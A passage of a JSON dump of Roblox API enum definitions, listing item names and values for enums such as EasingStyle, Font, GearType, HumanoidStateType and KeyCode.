Value":1,"Enum":"DevTouchCameraMovementMode"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":2,"Enum":"DevTouchCameraMovementMode"},{"type":"Enum","Name":"DevTouchMovementMode","tags":[]},{"type":"EnumItem","Name":"UserChoice","tags":[],"Value":0,"Enum":"DevTouchMovementMode"},{"type":"EnumItem","Name":"Thumbstick","tags":[],"Value":1,"Enum":"DevTouchMovementMode"},{"type":"EnumItem","Name":"DPad","tags":[],"Value":2,"Enum":"DevTouchMovementMode"},{"type":"EnumItem","Name":"Thumbpad","tags":[],"Value":3,"Enum":"DevTouchMovementMode"},{"type":"EnumItem","Name":"ClickToMove","tags":[],"Value":4,"Enum":"DevTouchMovementMode"},{"type":"EnumItem","Name":"Scriptable","tags":[],"Value":5,"Enum":"DevTouchMovementMode"},{"type":"Enum","Name":"DialogPurpose","tags":[]},{"type":"EnumItem","Name":"Quest","tags":[],"Value":0,"Enum":"DialogPurpose"},{"type":"EnumItem","Name":"Help","tags":[],"Value":1,"Enum":"DialogPurpose"},{"type":"EnumItem","Name":"Shop","tags":[],"Value":2,"Enum":"DialogPurpose"},{"type":"Enum","Name":"DialogTone","tags":[]},{"type":"EnumItem","Name":"Neutral","tags":[],"Value":0,"Enum":"DialogTone"},{"type":"EnumItem","Name":"Friendly","tags":[],"Value":1,"Enum":"DialogTone"},{"type":"EnumItem","Name":"Enemy","tags":[],"Value":2,"Enum":"DialogTone"},{"type":"Enum","Name":"EasingDirection","tags":[]},{"type":"EnumItem","Name":"In","tags":[],"Value":0,"Enum":"EasingDirection"},{"type":"EnumItem","Name":"Out","tags":[],"Value":1,"Enum":"EasingDirection"},{"type":"EnumItem","Name":"InOut","tags":[],"Value":2,"Enum":"EasingDirection"},{"type":"Enum","Name":"EasingStyle","tags":[]},{"type":"EnumItem","Name":"Linear","tags":[],"Value":0,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Sine","tags":[],"Value":1,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Back","tags":[],"Value":2,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Quad","tags":[],"Value":3,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Quart","tags":[],"Value":4,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Quint","tags":[],"Value":5,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Bounce","tags":[],"Value":6,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Elastic","tags":[],"Value":7,"Enum":"EasingStyle"},{"type":"Enum","Name":"EnviromentalPhysicsThrottle","tags":[]},{"type":"EnumItem","Name":"DefaultAuto","tags":[],"Value":0,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Disabled","tags":[],"Value":1,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Always","tags":[],"Value":2,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Skip2","tags":[],"Value":3,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Skip4","tags":[],"Value":4,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Skip8","tags":[],"Value":5,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Skip16","tags":[],"Value":6,"Enum":"EnviromentalPhysicsThrottle"},{"type":"Enum","Name":"ErrorReporting","tags":[]},{"type":"EnumItem","Name":"DontReport","tags":[],"Value":0,"Enum":"ErrorReporting"},{"type":"EnumItem","Name":"Prompt","tags":[],"Value":1,"Enum":"ErrorReporting"},{"type":"EnumItem","Name":"Report","tags":[],"Value":2,"Enum":"ErrorReporting"},{"type":"Enum","Name":"ExplosionType","tags":[]},{"type":"EnumItem","Name":"NoCraters","tags":[],"Value":0,"Enum":"ExplosionType"},{"type":"EnumItem","Name":"Craters","tags":[],"Value":1,"Enum":"ExplosionType"},{"type":"EnumItem","Name":"CratersAndDebris","tags":[],"Value":2,"Enum":"ExplosionType"},{"type":"Enum","Name":"FilterResult","tags":[]},{"type":"EnumItem","Name":"Rejected","tags":[],"Value":1,"Enum":"FilterResult"},{"type":"EnumItem","Name":"Accepted","tags":[],"Value":0,"Enum":"FilterResult"},{"type":"Enum","Name":"Font","tags":[]},{"type":"EnumItem","Name":"Legacy","tags":[],"Value":0,"Enum":"Font"},{"type":"EnumItem","Name":"Arial","tags":[],"Value":1,"Enum":"Font"},{"type":"EnumItem","Name":"ArialBold","tags":[],"Value":2,"Enum":"Font"},{"type":"EnumItem","Name":"SourceSans","tags":[],"Value":3,"Enum":"Font"},{"type":"EnumItem","Name":"SourceSansBold","tags":[],"Value":4,"Enum":"Font"},{"type":"EnumItem","Name":"SourceSansLight","tags":[],"Value":5,"Enum":"Font"},{"type":"EnumItem","Name":"SourceSansItalic","tags":[],"Value":6,"Enum":"Font"},{"type":"Enum","Name":"FontSize","tags":[]},{"type":"EnumItem","Name":"Size8","tags":[],"Value":0,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size9","tags":[],"Value":1,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size10","tags":[],"Value":2,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size11","tags":[],"Value":3,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size12","tags":[],"Value":4,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size14","tags":[],"Value":5,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size18","tags":[],"Value":6,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size24","tags":[],"Value":7,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size36","tags":[],"Value":8,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size48","tags":[],"Value":9,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size28","tags":[],"Value":10,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size32","tags":[],"Value":11,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size42","tags":[],"Value":12,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size60","tags":[],"Value":13,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size96","tags":[],"Value":14,"Enum":"FontSize"},{"type":"Enum","Name":"FormFactor","tags":[]},{"type":"EnumItem","Name":"Symmetric","tags":[],"Value":0,"Enum":"FormFactor"},{"type":"EnumItem","Name":"Brick","tags":[],"Value":1,"Enum":"FormFactor"},{"type":"EnumItem","Name":"Plate","tags":[],"Value":2,"Enum":"FormFactor"},{"type":"EnumItem","Name":"Custom","tags":[],"Value":3,"Enum":"FormFactor"},{"type":"Enum","Name":"FrameStyle","tags":[]},{"type":"EnumItem","Name":"Custom","tags":[],"Value":0,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"ChatBlue","tags":[],"Value":1,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"RobloxSquare","tags":[],"Value":2,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"RobloxRound","tags":[],"Value":3,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"ChatGreen","tags":[],"Value":4,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"ChatRed","tags":[],"Value":5,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"DropShadow","tags":[],"Value":6,"Enum":"FrameStyle"},{"type":"Enum","Name":"FramerateManagerMode","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"FramerateManagerMode"},{"type":"EnumItem","Name":"On","tags":[],"Value":1,"Enum":"FramerateManagerMode"},{"type":"EnumItem","Name":"Off","tags":[],"Value":2,"Enum":"FramerateManagerMode"},{"type":"Enum","Name":"FriendRequestEvent","tags":[]},{"type":"EnumItem","Name":"Issue","tags":[],"Value":0,"Enum":"FriendRequestEvent"},{"type":"EnumItem","Name":"Revoke","tags":[],"Value":1,"Enum":"FriendRequestEvent"},{"type":"EnumItem","Name":"Accept","tags":[],"Value":2,"Enum":"FriendRequestEvent"},{"type":"EnumItem","Name":"Deny","tags":[],"Value":3,"Enum":"FriendRequestEvent"},{"type":"Enum","Name":"FriendStatus","tags":[]},{"type":"EnumItem","Name":"Unknown","tags":[],"Value":0,"Enum":"FriendStatus"},{"type":"EnumItem","Name":"NotFriend","tags":[],"Value":1,"Enum":"FriendStatus"},{"type":"EnumItem","Name":"Friend","tags":[],"Value":2,"Enum":"FriendStatus"},{"type":"EnumItem","Name":"FriendRequestSent","tags":[],"Value":3,"Enum":"FriendStatus"},{"type":"EnumItem","Name":"FriendRequestReceived","tags":[],"Value":4,"Enum":"FriendStatus"},{"type":"Enum","Name":"FunctionalTestResult","tags":[]},{"type":"EnumItem","Name":"Passed","tags":[],"Value":0,"Enum":"FunctionalTestResult"},{"type":"EnumItem","Name":"Warning","tags":[],"Value":1,"Enum":"FunctionalTestResult"},{"type":"EnumItem","Name":"Error","tags":[],"Value":2,"Enum":"FunctionalTestResult"},{"type":"Enum","Name":"GearGenreSetting","tags":[]},{"type":"EnumItem","Name":"AllGenres","tags":[],"Value":0,"Enum":"GearGenreSetting"},{"type":"EnumItem","Name":"MatchingGenreOnly","tags":[],"Value":1,"Enum":"GearGenreSetting"},{"type":"Enum","Name":"GearType","tags":[]},{"type":"EnumItem","Name":"MeleeWeapons","tags":[],"Value":0,"Enum":"GearType"},{"type":"EnumItem","Name":"RangedWeapons","tags":[],"Value":1,"Enum":"GearType"},{"type":"EnumItem","Name":"Explosives","tags":[],"Value":2,"Enum":"GearType"},{"type":"EnumItem","Name":"PowerUps","tags":[],"Value":3,"Enum":"GearType"},{"type":"EnumItem","Name":"NavigationEnhancers","tags":[],"Value":4,"Enum":"GearType"},{"type":"EnumItem","Name":"MusicalInstruments","tags":[],"Value":5,"Enum":"GearType"},{"type":"EnumItem","Name":"SocialItems","tags":[],"Value":6,"Enum":"GearType"},{"type":"EnumItem","Name":"BuildingTools","tags":[],"Value":7,"Enum":"GearType"},{"type":"EnumItem","Name":"Transport","tags":[],"Value":8,"Enum":"GearType"},{"type":"Enum","Name":"Genre","tags":[]},{"type":"EnumItem","Name":"All","tags":[],"Value":0,"Enum":"Genre"},{"type":"EnumItem","Name":"TownAndCity","tags":[],"Value":1,"Enum":"Genre"},{"type":"EnumItem","Name":"Fantasy","tags":[],"Value":2,"Enum":"Genre"},{"type":"EnumItem","Name":"SciFi","tags":[],"Value":3,"Enum":"Genre"},{"type":"EnumItem","Name":"Ninja","tags":[],"Value":4,"Enum":"Genre"},{"type":"EnumItem","Name":"Scary","tags":[],"Value":5,"Enum":"Genre"},{"type":"EnumItem","Name":"Pirate","tags":[],"Value":6,"Enum":"Genre"},{"type":"EnumItem","Name":"Adventure","tags":[],"Value":7,"Enum":"Genre"},{"type":"EnumItem","Name":"Sports","tags":[],"Value":8,"Enum":"Genre"},{"type":"EnumItem","Name":"Funny","tags":[],"Value":9,"Enum":"Genre"},{"type":"EnumItem","Name":"WildWest","tags":[],"Value":10,"Enum":"Genre"},{"type":"EnumItem","Name":"War","tags":[],"Value":11,"Enum":"Genre"},{"type":"EnumItem","Name":"SkatePark","tags":[],"Value":12,"Enum":"Genre"},{"type":"EnumItem","Name":"Tutorial","tags":[],"Value":13,"Enum":"Genre"},{"type":"Enum","Name":"GraphicsMode","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":1,"Enum":"GraphicsMode"},{"type":"EnumItem","Name":"Direct3D9","tags":[],"Value":3,"Enum":"GraphicsMode"},{"type":"EnumItem","Name":"Direct3D11","tags":[],"Value":2,"Enum":"GraphicsMode"},{"type":"EnumItem","Name":"OpenGL","tags":[],"Value":4,"Enum":"GraphicsMode"},{"type":"EnumItem","Name":"NoGraphics","tags":[],"Value":5,"Enum":"GraphicsMode"},{"type":"Enum","Name":"HandlesStyle","tags":[]},{"type":"EnumItem","Name":"Resize","tags":[],"Value":0,"Enum":"HandlesStyle"},{"type":"EnumItem","Name":"Movement","tags":[],"Value":1,"Enum":"HandlesStyle"},{"type":"Enum","Name":"HttpContentType","tags":[]},{"type":"EnumItem","Name":"ApplicationJson","tags":[],"Value":0,"Enum":"HttpContentType"},{"type":"EnumItem","Name":"ApplicationXml","tags":[],"Value":1,"Enum":"HttpContentType"},{"type":"EnumItem","Name":"ApplicationUrlEncoded","tags":[],"Value":2,"Enum":"HttpContentType"},{"type":"EnumItem","Name":"TextPlain","tags":[],"Value":3,"Enum":"HttpContentType"},{"type":"EnumItem","Name":"TextXml","tags":[],"Value":4,"Enum":"HttpContentType"},{"type":"Enum","Name":"HumanoidDisplayDistanceType","tags":[]},{"type":"EnumItem","Name":"Viewer","tags":[],"Value":0,"Enum":"HumanoidDisplayDistanceType"},{"type":"EnumItem","Name":"Subject","tags":[],"Value":1,"Enum":"HumanoidDisplayDistanceType"},{"type":"EnumItem","Name":"None","tags":[],"Value":2,"Enum":"HumanoidDisplayDistanceType"},{"type":"Enum","Name":"HumanoidRigType","tags":[]},{"type":"EnumItem","Name":"R6","tags":[],"Value":0,"Enum":"HumanoidRigType"},{"type":"EnumItem","Name":"R15","tags":[],"Value":1,"Enum":"HumanoidRigType"},{"type":"Enum","Name":"HumanoidStateType","tags":[]},{"type":"EnumItem","Name":"FallingDown","tags":[],"Value":0,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Running","tags":[],"Value":8,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"RunningNoPhysics","tags":[],"Value":10,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Climbing","tags":[],"Value":12,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"StrafingNoPhysics","tags":[],"Value":11,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Ragdoll","tags":[],"Value":1,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"GettingUp","tags":[],"Value":2,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Jumping","tags":[],"Value":3,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Landed","tags":[],"Value":7,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Flying","tags":[],"Value":6,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Freefall","tags":[],"Value":5,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Seated","tags":[],"Value":13,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"PlatformStanding","tags":[],"Value":14,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Dead","tags":[],"Value":15,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Swimming","tags":[],"Value":4,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Physics","tags":[],"Value":16,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"None","tags":[],"Value":18,"Enum":"HumanoidStateType"},{"type":"Enum","Name":"InOut","tags":[]},{"type":"EnumItem","Name":"Edge","tags":[],"Value":0,"Enum":"InOut"},{"type":"EnumItem","Name":"Inset","tags":[],"Value":1,"Enum":"InOut"},{"type":"EnumItem","Name":"Center","tags":[],"Value":2,"Enum":"InOut"},{"type":"Enum","Name":"InfoType","tags":[]},{"type":"EnumItem","Name":"Asset","tags":[],"Value":0,"Enum":"InfoType"},{"type":"EnumItem","Name":"Product","tags":[],"Value":1,"Enum":"InfoType"},{"type":"Enum","Name":"InputType","tags":[]},{"type":"EnumItem","Name":"NoInput","tags":[],"Value":0,"Enum":"InputType"},{"type":"EnumItem","Name":"LeftTread","tags":[],"Value":1,"Enum":"InputType"},{"type":"EnumItem","Name":"RightTread","tags":[],"Value":2,"Enum":"InputType"},{"type":"EnumItem","Name":"Steer","tags":[],"Value":3,"Enum":"InputType"},{"type":"EnumItem","Name":"Throtle","tags":[],"Value":4,"Enum":"InputType"},{"type":"EnumItem","Name":"UpDown","tags":[],"Value":6,"Enum":"InputType"},{"type":"EnumItem","Name":"Action1","tags":[],"Value":7,"Enum":"InputType"},{"type":"EnumItem","Name":"Action2","tags":[],"Value":8,"Enum":"InputType"},{"type":"EnumItem","Name":"Action3","tags":[],"Value":9,"Enum":"InputType"},{"type":"EnumItem","Name":"Action4","tags":[],"Value":10,"Enum":"InputType"},{"type":"EnumItem","Name":"Action5","tags":[],"Value":11,"Enum":"InputType"},{"type":"EnumItem","Name":"Constant","tags":[],"Value":12,"Enum":"InputType"},{"type":"EnumItem","Name":"Sin","tags":[],"Value":13,"Enum":"InputType"},{"type":"Enum","Name":"JointCreationMode","tags":[]},{"type":"EnumItem","Name":"All","tags":[],"Value":0,"Enum":"JointCreationMode"},{"type":"EnumItem","Name":"Surface","tags":[],"Value":1,"Enum":"JointCreationMode"},{"type":"EnumItem","Name":"None","tags":[],"Value":2,"Enum":"JointCreationMode"},{"type":"Enum","Name":"JointType","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":22,"Enum":"JointType"},{"type":"EnumItem","Name":"Rotate","tags":[],"Value":6,"Enum":"JointType"},{"type":"EnumItem","Name":"RotateP","tags":[],"Value":7,"Enum":"JointType"},{"type":"EnumItem","Name":"RotateV","tags":[],"Value":8,"Enum":"JointType"},{"type":"EnumItem","Name":"Glue","tags":[],"Value":9,"Enum":"JointType"},{"type":"EnumItem","Name":"Weld","tags":[],"Value":1,"Enum":"JointType"},{"type":"EnumItem","Name":"Snap","tags":[],"Value":3,"Enum":"JointType"},{"type":"Enum","Name":"KeyCode","tags":[]},{"type":"EnumItem","Name":"Unknown","tags":[],"Value":0,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Backspace","tags":[],"Value":8,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Tab","tags":[],"Value":9,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Clear","tags":[],"Value":12,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Return","tags":[],"Value":13,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Pause","tags":[],"Value":19,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Escape","tags":[],"Value":27,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Space","tags":[],"Value":32,"Enum":"KeyCode"},{"type":"EnumItem","Name":"QuotedDouble","tags":[],"Value":34,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Hash","tags":[],"Value":35,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Dollar","tags":[],"Value":36,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Percent","tags":[],"Value":37,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Ampersand","tags":[],"Value":38,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Quote","tags":[],"Value":39,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftParenthesis","tags":[],"Value":40,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightParenthesis","tags":[],"Value":41,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Asterisk","tags":[],"Value":42,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Plus","tags":[],"Value":43,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Comma","tags":[],"Value":44,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Minus","tags":[],"Value":45,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Period","tags":[],"Value":46,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Slash","tags":[],"Value":47,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Zero","tags":[],"Value":48,"Enum":"KeyCode"},{"type":"EnumItem","Name":"One","tags":[],"Value":49,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Two","tags":[],"Value":50,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Three","tags":[],"Value":51,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Four","tags":[],"Value":52,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Five","tags":[],"Value":53,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Six","tags":[],"Value":54,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Seven","tags":[],"Value":55,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Eight","tags":[],"Value":56,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Nine","tags":[],"Value":57,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Colon","tags":[],"Value":58,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Semicolon","tags":[],"Value":59,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LessThan","tags":[],"Value":60,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Equals","tags":[],"Value":61,"Enum":"KeyCode"},{"type":"EnumItem","Name":"GreaterThan","tags":[],"Value":62,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Question","tags":[],"Value":63,"Enum":"KeyCode"},{"type":"EnumItem","Name":"At","tags":[],"Value":64,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftBracket","tags":[],"Value":91,"Enum":"KeyCode"},{"type":"EnumItem","Name":"BackSlash","tags":[],"Value":92,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightBracket","tags":[],"Value":93,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Caret","tags":[],"Value":94,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Underscore","tags":[],"Value":95,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Backquote","tags":[],"Value":96,"Enum":"KeyCode"},{"type":"EnumItem","Name":"A","tags":[],"Value":97,"Enum":"KeyCode"},{"type":"EnumItem","Name":"B","tags":[],"Value":98,"Enum":"KeyCode"},{"type":"EnumItem","Name":"C","tags":[],"Value":99,"Enum":"KeyCode"},{"type":"EnumItem","Name":"D","tags":[],"Value":100,"Enum":"KeyCode"},{"type":"EnumItem","Name":"E","tags":[],"Value":101,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F","tags":[],"Value":102,"Enum":"KeyCode"},{"type":"EnumItem","Name":"G","tags":[],"Value":103,"Enum":"KeyCode"},{"type":"EnumItem","Name":"H","tags":[],"Value":104,"Enum":"KeyCode"},{"type":"EnumItem","Name":"I","tags":[],"Value":105,"Enum":"KeyCode"},{"type":"EnumItem","Name":"J","tags":[],"Value":106,"Enum":"KeyCode"},{"type":"EnumItem","Name":"K","tags":[],"Value":107,"Enum":"KeyCode"},{"type":"EnumItem","Name":"L","tags":[],"Value":108,"Enum":"KeyCode"},{"type":"EnumItem","Name":"M","tags":[],"Value":109,"Enum":"KeyCode"},{"type":"EnumItem","Name":"N","tags":[],"Value":110,"Enum":"KeyCode"},{"type":"EnumItem","Name":"O","tags":[],"Value":111,"Enum":"KeyCode"},{"type":"EnumItem","Name":"P","tags":[],"Value":112,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Q","tags":[],"Value":113,"Enum":"KeyCode"},{"type":"EnumItem","Name":"R","tags":[],"Value":114,"Enum":"KeyCode"},{"type":"EnumItem","Name":"S","tags":[],"Value":115,"Enum":"KeyCode"},{"type":"EnumItem","Name":"T","tags":[],"Value":116,"Enum":"KeyCode"},{"type":"EnumItem","Name":"U","tags":[],"Value":117,"Enum":"KeyCode"},{"type":"EnumItem","Name":"V","tags":[],"Value":118,"Enum":"KeyCode"},{"type":"EnumItem","Name":"W","tags":[],"Value":119,"Enum":"KeyCode"},{"type":"EnumItem","Name":"X","tags":[],"Value":120,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Y","tags":[],"Value":121,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Z","tags":[],"Value":122,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftCurly","tags":[],"Value":123,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Pipe","tags":[],"Value":124,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightCurly","tags":[],"Value":125,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Tilde","tags":[],"Value":126,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Delete","tags":[],"Value":127,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadZero","tags":[],"Value":256,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadOne","tags":[],"Value":257,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadTwo","tags":[],"Value":258,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadThree","tags":[],"Value":259,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadFour","tags":[],"Value":260,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadFive","tags":[],"Value":261,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadSix","tags":[],"Value":262,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadSeven","tags":[],"Value":263,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadEight","tags":[],"Value":264,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadNine","tags":[],"Value":265,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadPeriod","tags":[],"Value":266,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadDivide","tags":[],"Value":267,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadMultiply","tags":[],"Value":268,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadMinus","tags":[],"Value":269,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadPlus","tags":[],"Value":270,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadEnter","tags":[],"Value":271,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadEquals","tags":[],"Value":272,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Up","tags":[],"Value":273,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Down","tags":[],"Value":274,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Right","tags":[],"Value":275,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Left","tags":[],"Value":276,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Insert","tags":[],"Value":277,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Home","tags":[],"Value":278,"Enum":"KeyCode"},{"type":"EnumItem","Name":"End","tags":[],"Value":279,"Enum":"KeyCode"},{"type":"EnumItem","Name":"PageUp","tags":[],"Value":280,"Enum":"KeyCode"},{"type":"EnumItem","Name":"PageDown","tags":[],"Value":281,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftShift","tags":[],"Value":304,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightShift","tags":[],"Value":303,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftMeta","tags":[],"Value":310,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightMeta","tags":[],"Value":309,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftAlt","tags":[],"Value":308,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightAlt","tags":[],"Value":307,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftControl","tags":[],"Value":306,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightControl","tags":[],"Value":305,"Enum":"KeyCode"},{"type":"EnumItem","Name":"CapsLock","tags":[],"Value":301,"Enum":"KeyCode"},{"type":"EnumItem","Name":"NumLock","tags":[],"Value":300,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ScrollLock","tags":[],"Value":302,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftSuper","tags":[],"Value":311,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightSuper","tags":[],"Value":312,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Mode","tags":[],"Value":313,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Compose","tags":[],"Value":314,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Help","tags":[],"Value":315,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Print","tags":[],"Value":316,"Enum":"KeyCode"},{"type":"EnumItem","Name":"SysReq","tags":[],"Value":317,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Break","tags":[],"Value":318,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Menu","tags":[],"Value":319,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Power","tags":[],"Value":320,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Euro","tags":[],"Value":321,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Undo","tags":[],"Value":322,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F1","tags":[],"Value":282,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F2","tags":[],"Value":283,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F3","tags":[],"Value":284,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F4","tags":[],"Value":285,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F5","tags":[],"Value":286,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F6","tags":[],"Value":287,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F7","tags":[],"Value":288,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F8","tags":[],"Value":289,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F9","tags":[],"Value":290,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F10","tags":[],"Value":291,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F11","tags":[],"Value":292,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F12","tags":[],"Value":293,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F13","tags":[],"Value":294,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F14","tags":[],"Value":295,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F15","tags":[],"Value":296,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World0","tags":[],"Value":160,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World1","tags":[],"Value":161,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World2","tags":[],"Value":162,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World3","tags":[],"Value":163,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World4","tags":[],"Value":164,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World5